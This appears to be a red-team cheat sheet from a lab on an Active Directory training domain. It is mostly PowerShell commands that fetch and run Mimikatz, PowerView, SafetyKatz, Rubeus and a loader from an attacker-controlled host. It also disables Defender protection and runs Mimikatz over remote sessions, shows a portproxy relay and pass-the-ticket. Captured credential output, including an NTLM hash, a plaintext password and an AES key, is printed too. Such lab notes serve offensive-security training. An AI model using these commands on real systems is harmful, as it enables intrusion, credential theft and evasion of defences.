# Delivery

Yes. I know. Delivery is not on Mitre Att&ck Framework. However, downloading and uploading files is an absolute necessity during a Red Team engagement.

## Download Files
### Download and Run in Memory

```
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellScript.ps1');Invoke-PowerShellScript -arg1 value -arg2 value
```

### Download from SMB

`Copy-Item -Source \\server\share\file -Destination C:\path\`

### Download in Powershell - WebClient

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://www.contoso.com/file","C:\path\file")
```

### Download in Powershell - Easy Download
```
iwr ((New-Object Net.WebClient).DownloadString('http://172.16.100.87/PowerView.ps1'))
```

### Download with Invoke-WebRequest

```
Invoke-WebRequest -Uri "http://www.contoso.com" -OutFile "C:\path\file"
```

### Download with Wget

```
wget "http://www.contoso.com" -outfile "file"
```

### Download with Authentication

```
Invoke-WebRequest -Uri https://www.contoso.com/ -OutFile C:"\path\file" -Credential "yourUserName"
```

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://172.16.99.87/PowerView.ps1","C:\Program Files (x86)\Jenkins\workspace\Project11\PowerView.ps1")
```

```
$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("http://172.16.99.87/PowerView.ps1","C:\Users\student487\Downloads\PowerView.ps1")



```

```
iex (iwr http://172.16.99.87/Invoke-Mimikatz.ps1 -UseBasicParsing)

iwr http://172.16.99.87/SafetyKatz.exe -OutFile "C:\Program Files (x86)\Jenkins\workspace\Project11\SafetyKatz.exe"

iwr http://172.16.99.87/mimikatz.exe -OutFile "C:\Program Files (x86)\Jenkins\workspace\Project11\mimikatz.exe"


iwr http://172.16.99.87/Loader.exe -OutFile "C:\Program Files (x86)\Jenkins\workspace\Project11\Loader.exe"




$sess = New-PSSession -ComputerName dcorp-mgmt.dollarcorp.moneycorp.local

$sess2 = New-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local

Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess

Invoke-command -ScriptBlock ${function:Invoke-Mimikatz} -Session $sess

Invoke-command -ScriptBlock{Get-Process -IncludeUserName} -Session $sess


Invoke-command -ScriptBlock{$ExecutionContext.SessionState.LanguageMode = "FullLanguage"} -Session $sess2


Invoke-command -ScriptBlock{whoami} -Session $sess
```

```
Authentication Id : 0 ; 64685 (00000000:0000fcad)
Session           : Service from 0
User Name         : svcadmin
Domain            : dcorp
Logon Server      : DCORP-DC
Logon Time        : 11/16/2021 8:50:08 PM
SID               : S-1-5-21-1874506631-3219952063-538504511-1122
	msv :	
	 [00000003] Primary
	 * Username : svcadmin
	 * Domain   : dcorp
	 * NTLM     : b38ff50264b74508085d82c69794a4d8
	 * SHA1     : a4ad2cd4082079861214297e1cae954c906501b9
	 * DPAPI    : fd3c6842994af6bd69814effeedc55d3
	tspkg :	
	wdigest :	
	 * Username : svcadmin
	 * Domain   : dcorp
	 * Password : (null)
	kerberos :	
	 * Username : svcadmin
	 * Domain   : DOLLARCORP.MONEYCORP.LOCAL
	 * Password : *ThisisBlasphemyThisisMadness!!
	ssp :	
	credman :	


$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.99.87/SafetyKatz.exe sekurlsa::ekeys exit
```


```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```


```
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.99.87"



iwr http://172.16.99.87/Loader.exe -OutFile C:\Users\Public\Loader.exe


iwr http://172.16.99.87/Rubeus.exe -OutFile C:\Users\Public\Rubeus.exe


echo Y | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe


$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit

```


6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011

./Rubeus.exe asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt